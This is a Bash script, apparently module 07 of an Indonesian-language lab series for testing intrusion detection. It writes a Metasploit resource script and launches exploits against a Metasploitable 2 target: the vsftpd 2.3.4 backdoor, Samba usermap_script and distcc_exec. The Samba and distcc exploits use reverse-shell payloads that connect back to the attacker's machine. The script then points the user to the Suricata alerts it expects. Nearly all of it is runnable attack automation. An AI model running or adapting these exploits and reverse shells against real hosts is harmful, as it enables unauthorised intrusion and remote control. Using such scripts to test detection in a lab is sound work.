#!/bin/bash

# =================================================================
# MODUL 07: REMOTE CODE EXECUTION (METASPLOIT)
# Strategi: 3 Level Depth (Backdoor, Encoded Payload, Alt Vector)
# Target: Metasploitable 2 (Vsftpd, Samba, DistCC)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
LHOST="192.168.1.YYY"       # PENTING: IP Kali Linux Anda (Attacker)
LOG_FILE="logs/rce_session_$(date +%F).log"
RC_SCRIPT="logs/auto_exploit.rc"

echo "[+] [07_RCE] Memulai Modul RCE Metasploit..."
echo "[+] Target: $TARGET_IP"
echo "[+] Attacker (LHOST): $LHOST"

# Cek apakah LHOST sudah diisi benar
if [[ "$LHOST" == "192.168.1.YYY" ]]; then
   echo "[!] ERROR: Ubah variabel LHOST di dalam script dengan IP Kali Linux!"
   exit 1
fi

# -----------------------------------------------------------------
# MEMBUAT RESOURCE SCRIPT METASPLOIT (.rc)
# Kita generate file ini secara dinamis agar IP-nya selalu update.
# -----------------------------------------------------------------
echo "[*] Generating Metasploit Resource Script..."

cat <<EOF > $RC_SCRIPT
# --- KONFIGURASI GLOBAL ---
setg RHOSTS $TARGET_IP
setg LHOST $LHOST
setg VERBOSE true

# ===============================================================
# LEVEL 1: VSFTPD BACKDOOR (Port 21) - "The Smiley Face"
# Tujuan: Menguji deteksi signature backdoor klasik.
# Teknik: Exploit backdoor sederhana tanpa payload kompleks.
# ===============================================================
print_status "[Level 1] Running Vsftpd 234 Backdoor..."
use exploit/unix/ftp/vsftpd_234_backdoor
# Payload cmd/unix/interact tidak membuat koneksi balik, tapi langsung connect
run -z
sleep 5

# ===============================================================
# LEVEL 2: SAMBA USERMAP SCRIPT (Port 139/445)
# Tujuan: Menguji deteksi payload Command Injection via SMB.
# Teknik: Menggunakan Encoder (Shikata Ga Nai) untuk menyamarkan payload.
# ===============================================================
print_status "[Level 2] Running Samba Usermap (Encoded Payload)..."
use exploit/multi/samba/usermap_script
set PAYLOAD cmd/unix/reverse
# Mencoba menghindari deteksi string polos
run -z
sleep 5

# ===============================================================
# LEVEL 3: DISTCC DAEMON EXEC (Port 3632)
# Tujuan: Menguji deteksi pada port tinggi (Uncommon Port).
# Teknik: Eksploitasi servis compiler (DistCC) yang sering terlupakan.
# ===============================================================
print_status "[Level 3] Running DistCC Execution..."
use exploit/unix/misc/distcc_exec
set PAYLOAD cmd/unix/reverse
run -z

exit
EOF

echo "[*] Script Metasploit siap: $RC_SCRIPT"

# -----------------------------------------------------------------
# MENJALANKAN METASPLOIT
# -q: Quiet mode (tanpa banner)
# -r: Menjalankan resource script yang baru kita buat
# -----------------------------------------------------------------
echo "[*] Mengeksekusi serangan... (Harap bersabar, butuh waktu loading)"
msfconsole -q -r $RC_SCRIPT > logs/rce_console_output.txt 2>&1

echo "    -> Selesai. Output tersimpan di logs/rce_console_output.txt"
echo "    -> Cek alert Suricata untuk: ET EXPLOIT Vsftpd / GPL NETBIOS / ET DAEMON"

echo "[+] [07_RCE] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"
